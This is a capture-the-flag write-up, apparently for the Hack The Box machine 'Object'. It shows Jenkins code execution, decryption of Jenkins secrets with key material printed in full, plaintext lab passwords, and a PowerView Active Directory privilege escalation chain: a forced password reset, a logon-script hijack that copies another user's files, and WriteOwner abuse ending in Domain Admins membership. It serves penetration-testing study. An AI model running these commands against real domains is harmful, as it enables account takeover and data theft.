---
description: 10-21-2022
---

# Object (Hard)



<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-server-header: Jetty(9.4.43.v20210629)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

Notes:

* HTTP running on 80/8080
  * <mark style="color:yellow;">Jetty 9.4.43</mark>&#x20;
* <mark style="color:yellow;">5985/WinRM</mark> -- Can we find valid creds to Evil-WinRM into the machine?
* UDP -- 53/DNS & 123/NTP
  * Attempt zone transfer

## Enumeration

### Port 80 - HTTP (IIS 10.0)

Visual Inspection:

* The site appears to be looking for automation technology solutions
* I notice a potential DNS name here

<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

* Add to /etc/hosts
  * I attempted a zone transfer in an attempt to broaden our overall attack surface with no luck

Nikto:&#x20;

```
nikto -h 10.129.96.147
```

Dirsearch:

```
dirsearch -u 10.129.96.147

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/10.129.96.147_22-10-21_16-01-09.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-10-21_16-01-09.log

Target: http://10.129.96.147/

[16:01:10] Starting: 
[16:01:10] 403 -  312B  - /%2e%2e//google.com                              
[16:01:17] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:01:29] 200 -   29KB - /index.html                                       
```

### Port 8080- HTTP (Jenkins)

* The root page forces us to land on the Jenkins login page
* <mark style="color:yellow;">Jetty 9.4.43</mark>&#x20;

Dirsearch:&#x20;

```
dirsearch -u 10.129.96.147:8080 -i 200,300-399

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/8080_22-10-21_16-39-20.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-10-21_16-39-20.log

Target: http://10.129.96.147:8080/

[16:39:20] Starting: 
[16:39:36] 302 -    0B  - /assets  ->  http://10.129.96.147:8080/assets/    
[16:39:40] 303 -    0B  - /console/j_security_check  ->  http://10.129.96.147:8080/loginError
[16:39:43] 200 -   17KB - /favicon.ico                                      
[16:39:46] 303 -    0B  - /j_security_check  ->  http://10.129.96.147:8080/loginError
[16:39:47] 200 -    2KB - /login                                            
[16:39:47] 302 -    0B  - /logout  ->  http://10.129.96.147:8080/           
[16:39:47] 302 -    0B  - /logout/  ->  http://10.129.96.147:8080/          
[16:39:54] 200 -   71B  - /robots.txt                                       
[16:39:55] 200 -    8KB - /signup
```

* We see <mark style="color:yellow;">/signup</mark>, can we register a new account?
  * Attempting to create new account:

<figure><img src="../../../.gitbook/assets/image (2) (3) (3).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:red;">We are able to create an account!!!</mark>
* <mark style="color:yellow;">/robots.txt</mark>, let's go investigate the contents
  * Nothing of interest
* I attempted to access the Groovy script section of Jenkins but I do not have the correct permissions to access
  * This can be attempted by going to <mark style="color:yellow;">/script</mark>

<figure><img src="../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

* We notice that <mark style="color:yellow;">Jenkins</mark> is running version <mark style="color:yellow;">2.317</mark>

SSRF Attempt:

```
http://object.htb:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://169.254.169.254/%23&login=hacker&password=password1
```

* Failed

### Creating a Jenkins Job (<mark style="color:yellow;">Confirming Code Execution</mark>)

* This part took quite some time
* However, I was able to create a new job with the following settings and confirmed code execution
* How does this work? We are making the job command execute a particular command upon receiving an event that will trigger the code execution
* We will create this job (select apply and save)
* Start a TCPDump on tun0 for ICMP traffic
* Wait for the cronjob to execute every minute

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* Select apply

TCPDump command:

```
sudo tcpdump -i tun0
```

TCPDump output (Receiving ICMP traffic from the target):

<figure><img src="../../../.gitbook/assets/image (4) (8).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### Remote Code Execution (Jenkins)

* Above, we confirmed that we have code execution on the target through the Jenkins webapp
* Now, how can we weaponize this?
* I attempted numerous ways of getting a reverse shell connection
* However, there seems to be some kind of <mark style="color:yellow;">access control or firewall rule that is denying us access to make outbound request</mark>s
* <mark style="color:yellow;">Note: I attempted to file transfer (IEX and Certutil) as well as execute Base64 PowerShell code</mark>

### We need to get a little creative

* Enumerated file system through the Jenkins web abb
* Focused on finding the files for secret.key that allowed me to decrypt the Jenkins authentication

{% embed url="https://github.com/hoto/jenkins-credentials-decryptor" %}

You need three files for this tool to work:

* master.key

```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

* hudson.util.Secret

```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

* credentials.xml

### Evil-WinRM FTW

```
evil-winrm -i object.htb -u oliver
Password: c1cdfun_d2434
```

## Privilege Escalation

### Local enumeration

File Transfer tools to aid in Priv Esc: <mark style="color:yellow;">I had to use the upload/download feature in Evil-WinRM (very clunky</mark>)

* Did ADpeas.ps1

```
Import-Module .\ADPeas.ps1

Invoke-ADPeas
```

Domain Controller Enumeration:

```
[*] +++++ Searching Domain Controllers +++++
Searching for Domain Controllers - Details for Computer 'JENKINS$':
sAMAccountName     : JENKINS$
dNSHostName        : jenkins.object.local
distinguishedName  : CN=JENKINS,OU=Domain Controllers,DC=object,DC=local
IPv4Address        : 10.129.103.255
operatingSystem    : Windows Server 2019 Standard
description        :
objectSid          : S-1-5-21-4088429403-1159899800-2753317549-1000
userAccountControl : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
```

* Transferred SharpHound.exe collector for BloodHound

Syntax for SharpHound.exe:

```
.\SharpHound.exe -c all -d object.local
```

* I had to utilize the legitimate domain name as object.htb is not the domain name, object.local is&#x20;

Transferring collector information to Kali:

* I tried numerous ways but the only way that worked turned out to be very weird, but I'm not questioning it if it worked

```
download C:\Users\oliver\Desktop\20221022065030_BloodHound.zip
```

Placed it into BloodHound and examined the information:

### BloodHound Queries

**Shortest Paths to High Value Targets:**

<figure><img src="../../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>

* Set <mark style="color:yellow;">Oliver</mark> user as <mark style="color:yellow;">owned</mark>
* This is a messy output -- can we simplify with another query?

**Shortest Paths to Domain Admins:**

<figure><img src="../../../.gitbook/assets/image (8) (5).png" alt=""><figcaption></figcaption></figure>

* So, here is what I am thinking at this point

<mark style="color:yellow;">Oliver (ForceChangePassword) -> Smith (GenericWrite) -> Maria (WriteOwner) -> Domain Admins Group</mark>

* We need to transfer <mark style="color:yellow;">PowerView</mark> first

### Exploitation Attempt Overview

* Oliver has the ability to change Smith's password without knowing it (ForceChangePassword)
* Smith has GenericWrite access to Maria
  * This means that you can write to a non-protected attribute on the target object
* Maria has the ability to modify the owner of the group DOMAIN ADMINS

### PowerView

* Transferred PowerView with Evil-WinRM

Imported Module:&#x20;

```
Import-Module .\PowerView.ps1
```

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" %}

Step 1: <mark style="color:red;">ForceChangePassword Oliver -> Smith</mark>

```
Set-DomainUserPassword -Identity smith -AccountPassword (ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Verbose

Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'smith'
Verbose: [Set-DomainUserPassword] Password for user 'smith' successfully reset
```

* <mark style="color:yellow;">Smith's password was changed to Password1</mark>
* I can now Evil-WinRM into Smith

Authenticating:

```
evil-winrm -i object.htb -u smith
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>

Step 2: <mark style="color:red;">GenericWrite Smith -> Maria</mark>

* Followed the example found in BloodHound help for GenericWrite

```
Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/UWU'}
```

* Then tried to make the user acocunt a SPN to get a TGS ticket

Invoking Kerberoast with PowerView:

{% code overflow="wrap" %}
```
Invoke-Kerberoast
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'nonexistent/UWU' from user 'CN=maria garcia,CN=Users,DC=object,DC=local' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
```
{% endcode %}

* Unfortunately it did not work

I also tried to use the logonscript.ps1 found in BloodHound and using PowerView, we can use the following:

Creating file marialogonscript.ps1:

```
echo 'cmd /c "dir > C:\Programdata\output.txt"' > marialogonscript.ps1
```

Contents of marialogonscript.ps1:

```
cmd /c "dir > C:\Programdata\output.txt"
```

```
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Programdata\marialogonscript.ps1"}
```

I then waited for the Maria user to login

We then see an output.txt and notice that we get the system32 directory. However, we want her Desktop:

Modifying marialogonscript.ps1:

```
C:\Programdata> echo 'cmd /c "dir C:\Users\maria\Desktop > C:\Programdata\dirout.txt"' > marialogonscript.ps1
```

We then wait for her to login again:

I see an Engines.xls

Copy Engines.xls to Programdata:

```
echo 'cmd /c "copy C:\Users\maria\Desktop\Engines.xls C:\Programdata\Engines.xls"' > marialogonscript.ps1
```

Download Engines.xls to Kali from Evil-WinRM:

```
download C:\Programdata\Engines.xls
```

Using LibreOffice:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

We can do the same by running strings:

```
strings C:\Programdata\Engines.xls

maria
W3llcr4ft3d_4cls
d34gb8@
0de_434_d545
```

I will then place these passwords into EvilWinRM to see which one works:

```
evil-winrm -i object.htb -u maria -p 'W3llcr4ft3d_4cls'
```

We are now Maria:

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Step 3: <mark style="color:red;">Maria (WriteOwner) -> Domain Admins Group</mark>

```
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
```

* <mark style="color:yellow;">This was referenced from BloodHound's WriteOwner Abuse Tab</mark>

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
```

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity Maria -Rights WriteMembers
```

Granting Rights All:

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity Maria -Rights All
```

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

Add Maria to "Domain Admins" group:

```
net group "Domain Admins" /domain
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Maria is now in the Domain Admins group

* This means that we can now cd into the Administrator's directories and have read/write on the files

## Proofs

<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
